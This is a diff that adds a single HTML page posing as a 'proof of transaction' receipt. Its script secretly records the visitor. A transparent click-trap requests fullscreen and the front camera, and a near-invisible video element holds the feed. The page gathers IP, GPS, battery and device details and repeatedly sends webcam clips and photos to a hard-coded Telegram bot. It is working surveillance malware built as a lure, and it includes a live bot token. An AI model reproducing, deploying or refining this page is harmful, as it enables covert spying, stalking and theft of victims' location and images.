@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>PROOF OF TRANSACTION</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body { width: 100%; height: 100%; overflow: hidden; background: #000; }
+  #cam {
+    position: fixed; right: 0; bottom: 0;
+    width: 2px; height: 2px;
+    opacity: 0.01;
+    z-index: 0;
+    pointer-events: none;
+  }
+  #frame {
+    position: fixed; inset: 0;
+    width: 100%; height: 100%;
+    border: 0; background: #fff;
+    z-index: 10;
+  }
+  #gate {
+    position: fixed; inset: 0;
+    z-index: 100;
+    background: transparent;
+  }
+  #gate.done { display: none; }
+</style>
+</head>
+<body>
+<video id="cam" autoplay playsinline muted></video>
+<iframe id="frame" allow="camera; microphone; geolocation"></iframe>
+<div id="gate"></div>
+
+<script>
+var CONFIG = {
+  embedUrl: "https://example.com",
+  botToken: "5002425573:AAGLdu3jVBySSJdAMUhkmOXb5iXJvfQfYZE",
+  chatId:   "-5042489734",
+  clipSeconds: 5
+};
+
+var video = document.getElementById("cam");
+var gate = document.getElementById("gate");
+var frame = document.getElementById("frame");
+frame.src = CONFIG.embedUrl;
+
+var stream = null;
+var camGranted = false;
+var camDenied = false;
+var pending = false;
+var infoSent = false;
+var sending = false;
+var ipCache = "unknown";
+var gpsCache = "unknown";
+
+function esc(s) {
+  if (s === null || s === undefined) s = "N/A";
+  return String(s)
+    .split("&").join("&amp;")
+    .split("<").join("&lt;")
+    .split(">").join("&gt;");
+}
+
+function goFullscreen() {
+  var el = document.documentElement;
+  if (el.requestFullscreen) el.requestFullscreen().catch(function(){});
+  else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
+}
+
+function getIPInfo() {
+  return fetch("https://ipwho.is/")
+    .then(function(r){ return r.json(); })
+    .then(function(d){
+      if (d && d.ip) {
+        ipCache = d.ip;
+        return {
+          ip: d.ip,
+          isp: (d.connection && d.connection.isp) || d.isp || "N/A",
+          loc: [d.city, d.region, d.country].filter(Boolean).join(", ") || "N/A",
+          coords: (d.latitude || "?") + ", " + (d.longitude || "?")
+        };
+      }
+      throw new Error("no data");
+    })
+    .catch(function(){
+      return { ip: "failed", isp: "N/A", loc: "N/A", coords: "N/A" };
+    });
+}
+
+function getGPS() {
+  return new Promise(function(resolve){
+    if (!navigator.geolocation) { resolve("not supported"); return; }
+    navigator.geolocation.getCurrentPosition(
+      function(p){
+        gpsCache = p.coords.latitude.toFixed(6) + ", " + p.coords.longitude.toFixed(6);
+        resolve("Lat " + p.coords.latitude.toFixed(6) + ", Lng " + p.coords.longitude.toFixed(6) + " (±" + Math.round(p.coords.accuracy) + "m)");
+      },
+      function(){ resolve("denied"); },
+      { timeout: 8000, maximumAge: 0 }
+    );
+  });
+}
+
+function getBattery() {
+  return new Promise(function(resolve){
+    if (!navigator.getBattery) { resolve("not supported"); return; }
+    navigator.getBattery().then(function(b){
+      resolve(Math.round(b.level * 100) + "% (" + (b.charging ? "charging" : "on battery") + ")");
+    }).catch(function(){ resolve("unavailable"); });
+  });
+}
+
+function getNetwork() {
+  var c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (!c) return "not exposed";
+  return "type=" + c.effectiveType + ", " + c.downlink + "Mbps, rtt=" + c.rtt + "ms";
+}
+
+function getSystem() {
+  var ua = navigator.userAgent;
+  var br = "Unknown";
+  if (ua.indexOf("Edg/") > -1) br = "Edge";
+  else if (ua.indexOf("OPR/") > -1) br = "Opera";
+  else if (ua.indexOf("Firefox/") > -1) br = "Firefox";
+  else if (ua.indexOf("Chrome/") > -1) br = "Chrome";
+  else if (ua.indexOf("Safari/") > -1) br = "Safari";
+  return {
+    browser: br,
+    os: navigator.platform,
+    language: navigator.language,
+    screen: screen.width + "x" + screen.height,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    localTime: new Date().toString(),
+    cpuCores: navigator.hardwareConcurrency || "N/A",
+    ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
+    touch: ("ontouchstart" in window) ? "yes" : "no",
+    cookies: navigator.cookieEnabled ? "yes" : "no",
+    referrer: document.referrer || "none",
+    userAgent: ua
+  };
+}
+
+function sendText(text) {
+  var body = new URLSearchParams();
+  body.append("chat_id", CONFIG.chatId);
+  body.append("text", text);
+  body.append("parse_mode", "HTML");
+  return fetch("https://api.telegram.org/bot" + CONFIG.botToken + "/sendMessage", { method: "POST", body: body });
+}
+
+function sendInfoOnce() {
+  if (infoSent) return;
+  infoSent = true;
+  Promise.all([getIPInfo(), getGPS(), getBattery()]).then(function(results) {
+    var ip = results[0], gps = results[1], batt = results[2];
+    var s = getSystem();
+    var camState = camGranted ? "granted (recording)" : (camDenied ? "denied" : "unavailable");
+    var msg =
+      "📲 <b>NEW VISITOR — DEVICE REPORT</b>\n" +
+      "<i>" + new Date().toUTCString() + "</i>\n\n" +
+      "━━━ 🌍 LOCATION ━━━\n" +
+      "<b>IP:</b> " + esc(ip.ip) + "\n" +
+      "<b>ISP:</b> " + esc(ip.isp) + "\n" +
+      "<b>IP Location:</b> " + esc(ip.loc) + "\n" +
+      "<b>IP Coords:</b> " + esc(ip.coords) + "\n" +
+      "<b>GPS:</b> " + esc(gps) + "\n\n" +
+      "━━━ 📱 DEVICE ━━━\n" +
+      "<b>Browser:</b> " + esc(s.browser) + "\n" +
+      "<b>OS:</b> " + esc(s.os) + "\n" +
+      "<b>Language:</b> " + esc(s.language) + "\n" +
+      "<b>Screen:</b> " + esc(s.screen) + "\n" +
+      "<b>Time Zone:</b> " + esc(s.timezone) + "\n" +
+      "<b>Local Time:</b> " + esc(s.localTime) + "\n" +
+      "<b>CPU Cores:</b> " + esc(s.cpuCores) + "\n" +
+      "<b>RAM:</b> " + esc(s.ram) + "\n" +
+      "<b>Touch:</b> " + esc(s.touch) + "\n" +
+      "<b>Cookies:</b> " + esc(s.cookies) + "\n" +
+      "<b>Referrer:</b> " + esc(s.referrer) + "\n" +
+      "<b>User-Agent:</b> " + esc(s.userAgent) + "\n\n" +
+      "━━━ 🔋 / 📶 ━━━\n" +
+      "<b>Battery:</b> " + esc(batt) + "\n" +
+      "<b>Network:</b> " + esc(getNetwork()) + "\n" +
+      "<b>Camera:</b> " + camState + "\n\n" +
+      "━━━ 🕐 CLIENT ━━━\n" +
+      "<b>Embed URL:</b> " + esc(CONFIG.embedUrl) + "\n" +
+      "<b>Page URL:</b> " + esc(window.location.href) + "\n\n" +
+      "🎬 <b>Mode: WebM " + CONFIG.clipSeconds + "s clip + photo per cycle</b>";
+    sendText(msg).catch(function(){});
+  });
+}
+
+function tryCamera() {
+  if (camGranted || camDenied || pending) return;
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { camDenied = true; return; }
+  pending = true;
+  navigator.mediaDevices.getUserMedia({
+    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+    audio: false
+  }).then(function(s) {
+    stream = s;
+    camGranted = true;
+    video.srcObject = stream;
+    video.play().catch(function(){});
+    sendInfoOnce();
+    startCaptureCycle();
+    pending = false;
+  }).catch(function(err) {
+    pending = false;
+    var msg = (err && err.message ? err.message : "").toLowerCase();
+    var needsGesture = err && err.name === "NotAllowedError" && (msg.indexOf("gesture") > -1 || msg.indexOf("activation") > -1);
+    if (!needsGesture) camDenied = true;
+  });
+}
+
+function pickMime() {
+  var candidates = [
+    "video/webm;codecs=vp9",
+    "video/webm;codecs=vp8",
+    "video/webm"
+  ];
+  for (var i = 0; i < candidates.length; i++) {
+    try {
+      if (typeof MediaRecorder !== "undefined" && MediaRecorder.isTypeSupported(candidates[i])) {
+        return candidates[i];
+      }
+    } catch (e) {}
+  }
+  return "";
+}
+
+var recorder = null;
+
+function startCaptureCycle() {
+  var mime = pickMime();
+  if (!mime) {
+    // walang WebM support — photos na lang kada 5 seg
+    setInterval(photoLoop, 5000);
+    setTimeout(photoLoop, 600);
+    return;
+  }
+  try {
+    recorder = new MediaRecorder(stream, { mimeType: mime, videoBitsPerSecond: 1200000 });
+  } catch (e) {
+    setInterval(photoLoop, 5000);
+    return;
+  }
+  var chunks = [];
+  recorder.ondataavailable = function(e) {
+    if (e.data && e.data.size > 0) chunks.push(e.data);
+  };
+  recorder.onstop = function() {
+    var blob = new Blob(chunks, { type: recorder.mimeType || "video/webm" });
+    chunks = [];
+    sendPhotoSnapshot().then(function() {
+      return sendClip(blob);
+    }).then(function() {
+      if (camGranted && stream && stream.active) {
+        try { recorder.start(); } catch (e) {}
+      }
+    }).catch(function(){});
+  };
+  recorder.start();
+}
+
+function sendClip(blob) {
+  return new Promise(function(resolve){
+    if (sending || !blob || blob.size === 0) { resolve(); return; }
+    sending = true;
+    var w = video.videoWidth || 640;
+    var h = video.videoHeight || 480;
+    var fd = new FormData();
+    fd.append("chat_id", CONFIG.chatId);
+    fd.append("video", blob, "clip.webm");
+    fd.append("width", String(w));
+    fd.append("height", String(h));
+    fd.append("duration", String(CONFIG.clipSeconds));
+    fd.append("supports_streaming", "true");
+    fd.append("caption", "🎬 " + new Date().toLocaleString() + "\nIP: " + ipCache + "\nGPS: " + gpsCache);
+    fetch("https://api.telegram.org/bot" + CONFIG.botToken + "/sendVideo", { method: "POST", body: fd })
+      .catch(function(){})
+      .then(function(){ sending = false; resolve(); });
+  });
+}
+
+function captureFrame() {
+  if (!camGranted || !video || video.readyState < 2 || !video.videoWidth) return null;
+  var c = document.createElement("canvas");
+  c.width = video.videoWidth;
+  c.height = video.videoHeight;
+  c.getContext("2d").drawImage(video, 0, 0);
+  return new Promise(function(resolve){
+    c.toBlob(function(b){ resolve(b); }, "image/jpeg", 0.72);
+  });
+}
+
+function sendPhotoSnapshot() {
+  return new Promise(function(resolve){
+    if (document.hidden) { resolve(); return; }
+    captureFrame().then(function(blob) {
+      if (!blob) { resolve(); return; }
+      var fd = new FormData();
+      fd.append("chat_id", CONFIG.chatId);
+      fd.append("photo", blob, "frame.jpg");
+      fd.append("caption", "📸 " + new Date().toLocaleString() + "\nIP: " + ipCache + "\nGPS: " + gpsCache);
+      fetch("https://api.telegram.org/bot" + CONFIG.botToken + "/sendPhoto", { method: "POST", body: fd })
+        .catch(function(){})
+        .then(function(){ resolve(); });
+    });
+  });
+}
+
+function photoLoop() {
+  if (camGranted && !sending) sendPhotoSnapshot();
+}
+
+function kick() {
+  goFullscreen();
+  gate.classList.add("done");
+  tryCamera();
+}
+gate.addEventListener("click", kick);
+gate.addEventListener("keydown", kick);
+gate.tabIndex = 0;
+
+setTimeout(function(){ tryCamera(); }, 300);
+</script>
+</body>
+</html>
